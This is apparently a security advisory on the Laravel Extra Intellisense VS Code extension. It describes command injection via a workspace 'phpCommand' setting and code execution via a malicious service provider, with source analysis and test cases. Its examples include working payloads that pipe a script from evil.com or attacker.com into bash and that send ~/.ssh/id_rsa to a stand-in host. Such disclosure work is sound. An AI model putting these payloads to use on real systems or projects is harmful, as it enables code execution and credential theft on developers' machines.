# Laravel Extra Intellisense Security Vulnerabilities

## Command Injection via phpCommand Configuration Setting

### Vulnerability name
Command Injection via phpCommand Configuration Setting

### Description
The Laravel Extra Intellisense extension executes PHP commands to extract information from Laravel projects for providing autocompletion features. The extension allows users to customize how PHP code is executed through the `LaravelExtraIntellisense.phpCommand` setting. This setting is read from the workspace configuration, which means it can be defined in a project's `.vscode/settings.json` file.

A malicious actor could create a Laravel project with a manipulated `.vscode/settings.json` file containing a crafted `phpCommand` value that injects arbitrary shell commands. When a developer opens this project in VSCode, the extension will execute the malicious commands automatically and repeatedly as it gathers information for autocompletion features.

The attack works as follows:
1. An attacker creates a malicious Laravel project with a `.vscode/settings.json` file
2. The configuration file contains a specially crafted `phpCommand` setting with injected commands
3. A developer opens the project in VSCode with the Laravel Extra Intellisense extension installed
4. The extension reads the malicious `phpCommand` setting from the workspace configuration
5. When the extension executes PHP code for autocompletion, it uses the malicious command template
6. The injected commands execute on the developer's system with their privileges

### Impact
This vulnerability allows arbitrary code execution on the developer's machine. An attacker could:
- Exfiltrate sensitive data (SSH keys, environment variables, credentials)
- Install malware or backdoors
- Access other projects and repositories on the system
- Pivot to other systems on the network

The code execution happens with the full privileges of the VSCode process, giving the attacker broad access to the developer's environment.

### Vulnerability rank
Critical

### Currently implemented mitigations
The extension does implement some escaping mechanisms for the PHP code that gets executed:
- Double quotes are escaped with backslashes
- On Unix-like platforms, dollar signs, single quotes, and double quotes are escaped

However, these mitigations only protect the PHP code parameter and not the command template itself.

The README does include a security note warning users that "This extension runs your Laravel application automatically and periodically," but it doesn't explicitly warn about the risks of opening untrusted projects.

### Missing mitigations
1. The extension should validate the `phpCommand` setting to ensure it matches expected patterns
2. Command sanitization to prevent injection of arbitrary shell commands
3. A prompt or warning when using a non-default `phpCommand` from workspace settings
4. An option to disable workspace-specific `phpCommand` settings in favor of user-level settings

### Preconditions
For this vulnerability to be exploited:
1. A user must have the Laravel Extra Intellisense extension installed in VSCode
2. The user must open a malicious Laravel project containing a crafted `.vscode/settings.json` file
3. The user must allow the extension to execute commands (which happens by default)

### Source code analysis
The vulnerability is in the `runPhp` function in `helpers.ts`:

```typescript
static runPhp(code: string, description: string|null = null) : Promise<string> {
  code = code.replace(/\"/g, "\\\"");
  if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
    code = code.replace(/\$/g, "\\$");
    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
  }
  let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
  let command = commandTemplate.replace("{code}", code);

  // Execute the command with child_process.exec
  cp.exec(command, { cwd: /* project directory */ }, callback);
}
```

The key issues are:

1. The function reads the `phpCommand` setting from workspace configuration without validation
2. The command template can be anything, including malicious shell commands
3. While the PHP code is escaped, the template itself is used as-is
4. The command is executed using `child_process.exec`, which spawns a shell

For example, if an attacker sets the following in `.vscode/settings.json`:

```json
{
  "LaravelExtraIntellisense.phpCommand": "curl https://evil.com/c | bash; php -r \"{code}\""
}
```

When the extension runs PHP code, it will first download and execute a script from evil.com before running the actual PHP code.

The extension runs PHP commands frequently as it watches for file changes and updates autocompletion data, so these malicious commands would be executed repeatedly.

### Security test case
1. Create a new Laravel project with the following file structure:
   ```
   /test-project
     /app
     /bootstrap
     /config
     /...other Laravel files...
     /.vscode/settings.json
   ```

2. In the `.vscode/settings.json` file, add:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "echo 'SECURITY_TEST: Command injection successful' > /tmp/vscode_test; php -r \"{code}\""
   }
   ```

3. Open the project in VSCode with the Laravel Extra Intellisense extension installed

4. Create or open a PHP file in the project and try to trigger autocomplete for a Laravel feature (e.g., type `view('` and wait for autocomplete to appear)

5. Check if the file `/tmp/vscode_test` was created and contains the message "SECURITY_TEST: Command injection successful"

If the file exists with the expected content, the vulnerability is confirmed. This demonstrates that arbitrary commands can be executed through the `phpCommand` setting.

For a more realistic attack, the injected command could be:
```
curl -s https://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64) > /dev/null; php -r "{code}"
```

This would silently exfiltrate the user's SSH private key to the attacker's server.

## Remote Code Execution via Malicious Laravel Service Provider

### Vulnerability Name
Remote Code Execution via Malicious Laravel Service Provider

### Description
This vulnerability allows a threat actor to execute arbitrary code on a user's system by creating a specially crafted Laravel project with malicious code in service providers, middleware, or other Laravel bootstrap components.

The VS Code extension automatically bootstraps the entire Laravel application to extract information like routes, views, models, etc. When a user opens a Laravel project containing malicious code, that code will be executed whenever the extension performs its analysis of the project structure, which happens periodically and automatically.

Steps to trigger the vulnerability:
1. Attacker creates a legitimate-looking Laravel project with a hidden malicious service provider
2. Target user opens the project in VS Code with Laravel Extra Intellisense extension enabled
3. The extension automatically bootstraps the Laravel application, loading all service providers
4. The malicious service provider's code executes with the permissions of the VS Code process

### Impact
The attacker can execute arbitrary code on the user's system with the privileges of the VS Code process. This could lead to:
- Data exfiltration
- Installation of malware
- Unauthorized access to local files
- Lateral movement within the user's system
- Potential persistence mechanisms through scheduled tasks or other means

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension includes a security warning in the README that acknowledges this risk:

> "This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete. [...] Also if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing."

### Missing Mitigations
- No sandboxing or privilege restriction when executing PHP code
- No user prompt before analyzing unfamiliar projects
- No code scanning to detect potentially malicious service providers
- No option to disable automatic execution and require manual triggering of analysis
- No limitation on what Laravel components are loaded during bootstrap

### Preconditions
- User must open a Laravel project containing malicious code in VS Code
- The Laravel Extra Intellisense extension must be enabled
- The user must have PHP installed and accessible from the command line

### Source Code Analysis
The vulnerability originates in the `runLaravel` method in `helpers.ts`, which bootstraps the Laravel application:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            "class VscodeLaravelExtraIntellisenseProvider extends \\Illuminate\\Support\\ServiceProvider" +
            "{" +
            "   public function register() {}" +
            "	public function boot()" +
            "	{" +
            "       if (method_exists($this->app['log'], 'setHandlers')) {" +
            "			$this->app['log']->setHandlers([new \\Monolog\\Handler\\ProcessHandler()]);" +
            "		}" +
            "	}" +
            "}" +
            "$app->register(new VscodeLaravelExtraIntellisenseProvider($app));" +
            "$kernel = $app->make(Illuminate\\Contracts\\Console\\Kernel::class);" +
            // ...execution continues
```

This code loads the Laravel application's autoloader and bootstrap file, which in turn loads all registered service providers. If a malicious service provider exists, it will be executed during this process.

The extension calls this method frequently. For example, in `RouteProvider.ts`:

```typescript
loadRoutes() {
    if (vscode.workspace.workspaceFolders instanceof Array && vscode.workspace.workspaceFolders.length > 0) {
        try {
            var self = this;
            Helpers.runLaravel(
                "echo json_encode(array_map(function ($route) {" +
                // ... processing code ...
                "}, app('router')->getRoutes()->getRoutes()));",
                "HTTP Routes"
            )
            // ...
        }
    }
}
```

Similar code exists in multiple provider classes, and they are all triggered automatically when the extension activates or when files change.

### Security Test Case
To demonstrate this vulnerability:

1. Create a malicious Laravel service provider:
   ```php
   <?php
   namespace App\Providers;

   use Illuminate\Support\ServiceProvider;

   class MaliciousProvider extends ServiceProvider
   {
       public function register()
       {
           // Create a file as proof of execution
           file_put_contents('/tmp/vscode_rce_proof.txt', 'Code execution successful at ' . date('Y-m-d H:i:s'));

           // A real attacker might use more dangerous code like:
           // shell_exec('curl -s https://attacker.com/payload | bash');
       }
   }
   ```

2. Register the provider in `config/app.php`:
   ```php
   'providers' => [
       // Standard Laravel providers...
       App\Providers\MaliciousProvider::class,
   ],
   ```

3. Send the project to the victim (e.g., as a GitHub repository, pull request, or downloaded template)

4. When the victim opens the project in VS Code with Laravel Extra Intellisense installed, the malicious code will execute automatically

5. Verify that `/tmp/vscode_rce_proof.txt` has been created, confirming successful code execution

This vulnerability is particularly dangerous because the code execution happens silently in the background without any indication to the user, and it will continue to be triggered periodically as the extension updates its cache of Laravel structures.
